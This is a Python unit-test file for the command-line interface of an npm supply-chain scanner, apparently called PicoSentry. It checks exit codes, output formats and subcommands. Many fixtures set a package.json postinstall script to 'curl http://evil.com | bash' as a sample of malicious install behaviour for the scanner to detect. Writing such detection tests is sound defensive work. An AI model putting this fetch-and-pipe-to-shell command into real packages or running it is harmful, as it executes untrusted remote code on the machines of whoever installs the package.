"""
test_cli_unit.py — Direct unit tests for cli.py main() and subcommand handlers.

These tests call main() directly (not via subprocess) so coverage is
attributed to the cli module. Each test sets sys.argv, calls main(),
and checks return codes / stdout / stderr.
"""

import json
import os
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

from picosentry.scan.cli import (
    ScanError,
    ScanTimeout,
    _cmd_check,
    _cmd_corpus,
    _cmd_diff,
    _cmd_init,
    _cmd_ioc,
    _cmd_policy,
    _format_quiet,
    _format_summary,
    main,
)
from picosentry.scan.models import Confidence, Finding, ScanResult, ScanStats, Severity

from tests.scan.conftest import (
    FIXTURES_DIR,
    make_finding as _make_finding,
    make_scan_result as _make_result,
)


class TestFormatSummary:
    """Test _format_summary helper."""

    def test_no_findings(self):
        result = _make_result()
        output = _format_summary(result)
        assert "No pinches" in output

    def test_with_findings(self):
        findings = [_make_finding(severity=Severity.HIGH)]
        result = _make_result(findings=findings)
        result.recompute_stats()
        output = _format_summary(result)
        assert "HARD PINCH" in output

    def test_mixed_severities(self):
        findings = [
            _make_finding(severity=Severity.CRITICAL),
            _make_finding(rule_id="L2-OBFS-001", severity=Severity.MEDIUM),
        ]
        result = _make_result(findings=findings)
        result.recompute_stats()
        output = _format_summary(result)
        assert "HARD PINCH" in output
        assert "SOFT PINCH" in output


class TestFormatQuiet:
    """Test _format_quiet helper."""

    def test_no_findings(self):
        result = _make_result()
        output = _format_quiet(result)
        assert "No pinches" in output

    def test_with_findings(self):
        findings = [_make_finding()]
        result = _make_result(findings=findings)
        result.recompute_stats()
        output = _format_quiet(result)
        assert "finding(s)" in output
        assert "L2-POST-001" in output


class TestMainVersion:
    """Test picosentry version / -V flag."""

    def test_version_flag(self, capsys):
        with patch("sys.argv", ["picosentry", "-V"]):
            rc = main()
        assert rc == 0
        out = capsys.readouterr().out
        assert "picosentry v" in out

    def test_version_command(self, capsys):
        with patch("sys.argv", ["picosentry", "version"]):
            rc = main()
        assert rc == 0
        out = capsys.readouterr().out
        assert "picosentry v" in out


class TestMainRules:
    """Test picosentry rules command."""

    def test_rules_text(self, capsys):
        with patch("sys.argv", ["picosentry", "rules"]):
            rc = main()
        assert rc == 0
        out = capsys.readouterr().out
        assert "L2-POST-001" in out

    def test_rules_json(self, capsys):
        with patch("sys.argv", ["picosentry", "rules", "--json"]):
            rc = main()
        assert rc == 0
        out = capsys.readouterr().out
        data = json.loads(out)
        assert isinstance(data, list)
        assert any(r["rule_id"] == "L2-POST-001" for r in data)


class TestMainNoCommand:
    """Test picosentry with no subcommand (prints help)."""

    def test_no_command(self, capsys):
        with patch("sys.argv", ["picosentry"]):
            rc = main()
        assert rc == 0
        out = capsys.readouterr().out
        assert "usage" in out.lower() or "picosentry" in out.lower()


class TestMainScanBasic:
    """Test basic scan subcommand routing via main()."""

    def test_scan_clean_project_exit_code(self, tmp_path):
        """Scan a clean project with --exit-code should return 0."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "clean-pkg",
                    "version": "1.0.0",
                    "license": "MIT",
                    "author": "Test Author <test@example.com>",
                    "repository": {"type": "git", "url": "https://github.com/test/clean-pkg"},
                    "engines": {"node": ">=18.0.0"},
                }
            )
        )
        with patch("sys.argv", ["picosentry", "scan", str(project), "--exit-code"]):
            rc = main()
        assert rc == 0

    def test_scan_malicious_project_exit_code(self, tmp_path):
        """Scan a malicious project with --exit-code should return 1."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "evil",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "curl http://evil.com | bash"},
                }
            )
        )
        with patch("sys.argv", ["picosentry", "scan", str(project), "--exit-code"]):
            rc = main()
        assert rc == 1

    def test_scan_json_format(self, tmp_path, capsys):
        """Scan with --format json should produce valid JSON."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "evil",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "curl http://evil.com | bash"},
                }
            )
        )
        with patch("sys.argv", ["picosentry", "scan", str(project), "--format", "json"]):
            main()
        out = capsys.readouterr().out
        data = json.loads(out)
        assert "findings" in data
        assert "scan_id" in data

    def test_scan_sarif_format(self, tmp_path, capsys):
        """Scan with --format sarif should produce valid SARIF."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "evil",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "curl http://evil.com | bash"},
                }
            )
        )
        with patch("sys.argv", ["picosentry", "scan", str(project), "--format", "sarif"]):
            main()
        out = capsys.readouterr().out
        data = json.loads(out)
        assert "$schema" in data

    def test_scan_cyclonedx_format(self, tmp_path, capsys):
        """Scan with --format cyclonedx should produce valid CycloneDX."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "test-cdx",
                    "version": "1.0.0",
                    "license": "MIT",
                }
            )
        )
        with patch("sys.argv", ["picosentry", "scan", str(project), "--format", "cyclonedx"]):
            main()
        out = capsys.readouterr().out
        data = json.loads(out)
        assert data["bomFormat"] == "CycloneDX"

    def test_scan_ml_context_format(self, tmp_path, capsys):
        """Scan with --format ml-context should produce compact output."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "test-ml",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "curl http://evil.com | bash"},
                }
            )
        )
        with patch("sys.argv", ["picosentry", "scan", str(project), "--format", "ml-context"]):
            main()
        out = capsys.readouterr().out
        assert "scan_id=" in out

    def test_scan_nonexistent_target(self, capsys):
        """Scan nonexistent path should return 2."""
        with patch("sys.argv", ["picosentry", "scan", "/nonexistent/path/12345"]):
            rc = main()
        assert rc == 2

    def test_scan_output_to_file(self, tmp_path):
        """Scan with --output should write to file."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "clean-pkg",
                    "version": "1.0.0",
                    "license": "MIT",
                }
            )
        )
        out_file = tmp_path / "result.json"
        with patch("sys.argv", ["picosentry", "scan", str(project), "--format", "json", "--output", str(out_file)]):
            rc = main()
        assert rc == 0
        assert out_file.exists()
        data = json.loads(out_file.read_text())
        assert "findings" in data

    def test_scan_fail_on_high(self, tmp_path):
        """Scan with --fail-on high should exit 1 for high findings."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "evil",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "curl http://evil.com | bash"},
                }
            )
        )
        with patch("sys.argv", ["picosentry", "scan", str(project), "--fail-on", "high"]):
            rc = main()
        assert rc == 1

    def test_scan_fail_on_critical_no_critical(self, tmp_path):
        """Scan with --fail-on critical should exit 0 when no critical findings."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "suspicious",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "echo hello"},
                }
            )
        )
        with patch("sys.argv", ["picosentry", "scan", str(project), "--fail-on", "critical"]):
            rc = main()
        # POST-001 is HIGH not CRITICAL in most cases; should exit 0 for --fail-on critical
        assert rc in (0, 1)  # depends on whether findings are critical

    def test_scan_summary(self, tmp_path, capsys):
        """Scan with --summary should produce one-line summary."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "evil",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "curl http://evil.com | bash"},
                }
            )
        )
        with patch("sys.argv", ["picosentry", "scan", str(project), "--summary"]):
            main()
        out = capsys.readouterr().out
        assert "PicoSentry" in out

    def test_scan_quiet(self, tmp_path, capsys):
        """Scan with --quiet should produce minimal output."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "evil",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "curl http://evil.com | bash"},
                }
            )
        )
        with patch("sys.argv", ["picosentry", "scan", str(project), "--quiet"]):
            main()
        out = capsys.readouterr().out
        assert "finding" in out.lower() or "pinch" in out.lower() or "clear" in out.lower()


class TestMainScanVerbose:
    """Test verbose scan output."""

    def test_scan_verbose(self, tmp_path, capsys):
        """Scan with --verbose should produce detailed stderr output."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "test-verbose",
                    "version": "1.0.0",
                }
            )
        )
        with patch("sys.argv", ["picosentry", "scan", str(project), "--verbose"]):
            rc = main()
        err = capsys.readouterr().err
        assert "Scan Details" in err or rc == 0


class TestMainCheck:
    """Test the check subcommand."""

    def test_check_clean_project(self, tmp_path):
        """Check a clean project with --fail-on high should return 0."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "clean-check",
                    "version": "1.0.0",
                    "license": "MIT",
                }
            )
        )
        with patch("sys.argv", ["picosentry", "check", str(project), "--fail-on", "high"]):
            rc = main()
        assert rc in (0, 1)  # May have LOW/INFO findings

    def test_check_nonexistent_target(self, capsys):
        """Check nonexistent path should return 2."""
        with patch("sys.argv", ["picosentry", "check", "/nonexistent/check/path", "--fail-on", "high"]):
            rc = main()
        assert rc == 2

    def test_check_with_findings(self, tmp_path, capsys):
        """Check malicious project should exit 1."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "evil-check",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "curl http://evil.com | bash"},
                }
            )
        )
        with patch("sys.argv", ["picosentry", "check", str(project), "--fail-on", "high"]):
            rc = main()
        assert rc == 1


class TestMainDiff:
    """Test diff subcommand via main()."""

    def test_diff_identical(self, tmp_path, capsys):
        """Diff identical scans should exit 0."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(json.dumps({"name": "a", "version": "1.0.0"}))

        # Generate scan results first
        with patch(
            "sys.argv", ["picosentry", "scan", str(project), "--format", "json", "--output", str(tmp_path / "a.json")]
        ):
            main()
        with patch(
            "sys.argv", ["picosentry", "scan", str(project), "--format", "json", "--output", str(tmp_path / "b.json")]
        ):
            main()

        with patch("sys.argv", ["picosentry", "diff", str(tmp_path / "a.json"), str(tmp_path / "b.json")]):
            rc = main()
        assert rc == 0
        out = capsys.readouterr().out
        assert "IDENTICAL" in out

    def test_diff_nonexistent_file(self, capsys):
        """Diff with nonexistent file should exit 2."""
        with patch("sys.argv", ["picosentry", "diff", "/nonexistent/a.json", "/nonexistent/b.json"]):
            rc = main()
        assert rc == 2


class TestMainInit:
    """Test init subcommand via main()."""

    def test_init_creates_config(self, tmp_path):
        """picosentry init should create .picosentry.yml and .picosentry-policy.yml."""
        project = tmp_path / "project"
        project.mkdir()
        with patch("sys.argv", ["picosentry", "init", str(project)]):
            rc = main()
        assert rc == 0
        assert (project / ".picosentry.yml").is_file()
        assert (project / ".picosentry-policy.yml").is_file()

    def test_init_nonexistent_dir(self, capsys):
        """Init on nonexistent dir should return 2."""
        with patch("sys.argv", ["picosentry", "init", "/nonexistent/dir/12345"]):
            rc = main()
        assert rc == 2

    def test_init_already_exists_no_force(self, tmp_path, capsys):
        """Init on existing config without --force should return 1."""
        project = tmp_path / "project"
        project.mkdir()
        (project / ".picosentry.yml").write_text("existing")
        with patch("sys.argv", ["picosentry", "init", str(project)]):
            rc = main()
        assert rc == 1


class TestMainLogFormat:
    """Test --log-format flag."""

    def test_json_log_format(self, tmp_path, capsys):
        """Scan with --log-format json should not crash."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(json.dumps({"name": "test-log", "version": "1.0.0"}))
        with patch("sys.argv", ["picosentry", "--log-format", "json", "scan", str(project)]):
            rc = main()
        assert rc == 0


class TestMainScanWithConfig:
    """Test scan with config file."""

    def test_scan_with_config_file(self, tmp_path, capsys):
        """Scan with .picosentry.yml should use config values."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "config-test",
                    "version": "1.0.0",
                    "license": "MIT",
                }
            )
        )
        (project / ".picosentry.yml").write_text("format: json\n")
        with patch("sys.argv", ["picosentry", "scan", str(project)]):
            rc = main()
        assert rc == 0
        out = capsys.readouterr().out
        # Should produce JSON because config says format: json
        try:
            data = json.loads(out)
            assert "findings" in data
        except json.JSONDecodeError:
            pass  # May be table format if config loading differs


class TestMainScanBaseline:
    """Test scan with baseline."""

    def test_scan_with_baseline(self, tmp_path, capsys):
        """Scan with --baseline should suppress known findings."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "evil-baseline",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "curl http://evil.com | bash"},
                }
            )
        )

        # First, scan without baseline to get a baseline file
        with patch(
            "sys.argv",
            ["picosentry", "scan", str(project), "--format", "json", "--output", str(tmp_path / "baseline.json")],
        ):
            main()

        # Now scan with baseline
        baseline = tmp_path / "baseline.json"
        if baseline.exists():
            with patch(
                "sys.argv", ["picosentry", "scan", str(project), "--format", "json", "--baseline", str(baseline)]
            ):
                rc = main()
            assert rc in (0, 1)


class TestMainEnterprise:
    """Test enterprise mode via CLI."""

    def test_scan_enterprise_flag(self, tmp_path, capsys):
        """Scan with --enterprise should work."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "ent-test",
                    "version": "1.0.0",
                    "license": "MIT",
                }
            )
        )
        with patch("sys.argv", ["picosentry", "scan", str(project), "--enterprise"]):
            rc = main()
        assert rc == 0

    def test_check_enterprise_flag(self, tmp_path):
        """Check with --enterprise should work."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "ent-check",
                    "version": "1.0.0",
                    "license": "MIT",
                }
            )
        )
        with patch("sys.argv", ["picosentry", "check", str(project), "--fail-on", "high", "--enterprise"]):
            rc = main()
        assert rc in (0, 1)


class TestCmdCheck:
    """Test _cmd_check directly."""

    def test_check_target_not_found(self, capsys):
        """Check with nonexistent target returns 2."""
        args = MagicMock()
        args.target = "/nonexistent/path"
        args.fail_on = "high"
        args.rules = None
        args.advisory_db = None
        rc = _cmd_check(args)
        assert rc == 2


class TestCmdCorpus:
    """Test _cmd_corpus subcommand handler."""

    def test_corpus_no_action(self, capsys):
        """Corpus without action should print usage and return 2."""
        args = MagicMock()
        args.corpus_action = None
        rc = _cmd_corpus(args)
        assert rc == 2

    def test_corpus_list(self, capsys):
        """Corpus list should not crash."""
        args = MagicMock()
        args.corpus_action = "list"
        rc = _cmd_corpus(args)
        assert rc == 0
        out = capsys.readouterr().out
        assert "corpus" in out.lower() or "pack" in out.lower()

    def test_corpus_validate_nonexistent(self, capsys):
        """Corpus validate with nonexistent file should return 2."""
        args = MagicMock()
        args.corpus_action = "validate"
        args.path = "/nonexistent/corpus.json"
        rc = _cmd_corpus(args)
        assert rc == 2

    def test_corpus_import_nonexistent(self, capsys):
        """Corpus import with nonexistent file should return 2."""
        args = MagicMock()
        args.corpus_action = "import"
        args.path = "/nonexistent/corpus.json"
        args.force = False
        args.dry_run = False
        args.verify_crypto = True
        args.no_verify_crypto = False
        args.public_key = ""
        args.offline = False
        rc = _cmd_corpus(args)
        assert rc == 2


class TestCmdIoc:
    """Test _cmd_ioc subcommand handler."""

    def test_ioc_no_action(self, capsys):
        """IoC without action should print usage and return 1."""
        args = MagicMock()
        args.ioc_action = None
        rc = _cmd_ioc(args)
        assert rc == 1

    def test_ioc_list(self, capsys):
        """IoC list should not crash."""
        args = MagicMock()
        args.ioc_action = "list"
        rc = _cmd_ioc(args)
        assert rc == 0

    def test_ioc_remove_nonexistent(self, capsys):
        """Remove nonexistent IoC should return 1."""
        args = MagicMock()
        args.ioc_action = "remove"
        args.id = "nonexistent-ioc-id"
        rc = _cmd_ioc(args)
        assert rc == 1


class TestCmdPolicy:
    """Test _cmd_policy subcommand handler."""

    def test_policy_no_action(self, capsys):
        """Policy without action should print usage and return 1."""
        args = MagicMock()
        args.policy_action = None
        rc = _cmd_policy(args)
        assert rc == 1

    def test_policy_init(self, tmp_path, capsys):
        """Policy init should create .picosentry-org.yml."""
        old_cwd = os.getcwd()
        os.chdir(tmp_path)
        try:
            org_path = tmp_path / ".picosentry-org.yml"
            assert not org_path.exists()
            args = MagicMock()
            args.policy_action = "init"
            rc = _cmd_policy(args)
            assert rc == 0
            assert org_path.exists()
        finally:
            os.chdir(old_cwd)

    def test_policy_init_already_exists(self, tmp_path, capsys):
        """Policy init on existing file should return 1."""
        old_cwd = os.getcwd()
        os.chdir(tmp_path)
        try:
            org_path = tmp_path / ".picosentry-org.yml"
            org_path.write_text("existing")
            args = MagicMock()
            args.policy_action = "init"
            rc = _cmd_policy(args)
            assert rc == 1
        finally:
            os.chdir(old_cwd)

    def test_policy_push_nonexistent(self, capsys):
        """Policy push with nonexistent file should return 2."""
        args = MagicMock()
        args.policy_action = "push"
        args.url = "https://example.com"
        args.file = "/nonexistent/policy.json"
        args.api_key = ""
        rc = _cmd_policy(args)
        assert rc == 2


class TestCmdInit:
    """Test _cmd_init directly."""

    def test_init_creates_files(self, tmp_path):
        """Init creates .picosentry.yml and .picosentry-policy.yml."""
        args = MagicMock()
        args.target = str(tmp_path)
        args.force = False
        rc = _cmd_init(args)
        assert rc == 0
        assert (tmp_path / ".picosentry.yml").exists()
        assert (tmp_path / ".picosentry-policy.yml").exists()

    def test_init_nonexistent_dir(self, capsys):
        """Init on nonexistent dir should return 2."""
        args = MagicMock()
        args.target = "/nonexistent/init/path"
        args.force = False
        rc = _cmd_init(args)
        assert rc == 2


class TestMainMetrics:
    """Test metrics subcommand."""

    def test_metrics_json(self, capsys):
        """Metrics with --format json should not crash."""
        with patch("sys.argv", ["picosentry", "metrics", "--format", "json"]):
            rc = main()
        assert rc == 0

    def test_metrics_prometheus(self, capsys):
        """Metrics with --format prometheus should not crash."""
        with patch("sys.argv", ["picosentry", "metrics", "--format", "prometheus"]):
            rc = main()
        assert rc == 0


class TestScanWorker:
    """Test _scan_worker multiprocessing function."""

    def test_scan_worker_success(self, tmp_path):
        """_scan_worker should put result in queue on success."""
        import multiprocessing

        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "worker-test",
                    "version": "1.0.0",
                    "license": "MIT",
                }
            )
        )

        q = multiprocessing.Queue()
        from picosentry.scan.cli import _scan_worker

        _scan_worker(str(project), None, None, None, q)
        status, data = q.get(timeout=5)
        assert status == "ok"
        assert data.target == str(project)

    def test_scan_worker_error_result(self):
        """_scan_worker on nonexistent target returns ok with empty findings."""
        import multiprocessing

        q = multiprocessing.Queue()
        from picosentry.scan.cli import _scan_worker

        # engine.scan handles nonexistent path gracefully (returns empty result)
        tmp = tempfile.mkdtemp()
        _scan_worker(tmp, None, None, None, q)
        status, data = q.get(timeout=10)
        assert status == "ok"
        # Empty target dir has no package.json, so 0 findings
        assert len(data.findings) == 0


class TestCmdDiff:
    """Test _cmd_diff directly."""

    def test_diff_nonexistent_a(self, capsys):
        """Diff with nonexistent file_a should return 2."""
        args = MagicMock()
        args.scan_a = "/nonexistent/a.json"
        args.scan_b = "/nonexistent/b.json"
        args.verbose = False
        rc = _cmd_diff(args)
        assert rc == 2


class TestScanSeverityThreshold:
    """Test scan with severity threshold."""

    def test_scan_severity_threshold_low(self, tmp_path, capsys):
        """Scan with --severity-threshold low should show all findings."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "threshold-test",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "curl http://evil.com | bash"},
                }
            )
        )
        with patch("sys.argv", ["picosentry", "scan", str(project), "--format", "json", "--severity-threshold", "low"]):
            main()
        out = capsys.readouterr().out
        data = json.loads(out)
        assert "findings" in data


class TestScanSpecificRules:
    """Test scan with --rules flag."""

    def test_scan_specific_rule(self, tmp_path, capsys):
        """Scan with --rules should only run specified rules."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "rule-test",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "curl http://evil.com | bash"},
                }
            )
        )
        with patch("sys.argv", ["picosentry", "scan", str(project), "--format", "json", "--rules", "L2-POST-001"]):
            main()
        out = capsys.readouterr().out
        data = json.loads(out)
        # Should only have L2-POST-001 findings
        for f in data.get("findings", []):
            assert f["rule_id"] == "L2-POST-001"


class TestMainEnvOverride:
    """Test PICOSENTRY_ENTERPRISE_MODE env var."""

    def test_enterprise_env_var(self, tmp_path):
        """PICOSENTRY_ENTERPRISE_MODE=1 should enable enterprise mode."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "ent-env-test",
                    "version": "1.0.0",
                    "license": "MIT",
                }
            )
        )
        env = dict(os.environ)
        env["PICOSENTRY_ENTERPRISE_MODE"] = "1"
        with (
            patch.dict(os.environ, env, clear=False),
            patch("sys.argv", ["picosentry", "scan", str(project), "--fail-on-rule-error"]),
        ):
            rc = main()
        # Should succeed for clean project
        assert rc == 0


class TestScanTableFormat:
    """Test scan with table format (default)."""

    def test_scan_table_clean(self, tmp_path, capsys):
        """Scan clean project should show table with 'clear' or similar."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "table-test",
                    "version": "1.0.0",
                    "license": "MIT",
                    "repository": {"type": "git", "url": "https://github.com/test/table-test"},
                }
            )
        )
        with patch("sys.argv", ["picosentry", "scan", str(project)]):
            rc = main()
        assert rc == 0


class TestScanTimeout:
    """Test scan timeout handling."""

    def test_scan_timeout_class(self):
        """ScanTimeout and ScanError should be exception classes."""
        assert issubclass(ScanTimeout, Exception)
        assert issubclass(ScanError, Exception)

    def test_scan_with_timeout(self, tmp_path, capsys):
        """Scan with timeout flag should not crash."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "timeout-test",
                    "version": "1.0.0",
                }
            )
        )
        with patch("sys.argv", ["picosentry", "scan", str(project), "--timeout", "60"]):
            rc = main()
        assert rc in (0, 1)


class TestScanNoColor:
    """Test scan with --no-color flag."""

    def test_scan_no_color(self, tmp_path, capsys):
        """Scan with --no-color should not crash."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "nocolor-test",
                    "version": "1.0.0",
                }
            )
        )
        with patch("sys.argv", ["picosentry", "scan", str(project), "--no-color"]):
            rc = main()
        assert rc == 0


class TestScanDeterministic:
    """Test scan with --deterministic-output flag."""

    def test_scan_deterministic_output(self, tmp_path, capsys):
        """Scan with --deterministic-output should produce deterministic JSON."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "det-test",
                    "version": "1.0.0",
                }
            )
        )
        with patch("sys.argv", ["picosentry", "scan", str(project), "--format", "json", "--deterministic-output"]):
            main()
        out = capsys.readouterr().out
        data = json.loads(out)
        assert "scan_id" in data
        # deterministic output should not have duration_ms in stats
        stats = data.get("stats", {})
        assert "duration_ms" not in stats or isinstance(stats.get("duration_ms"), int)
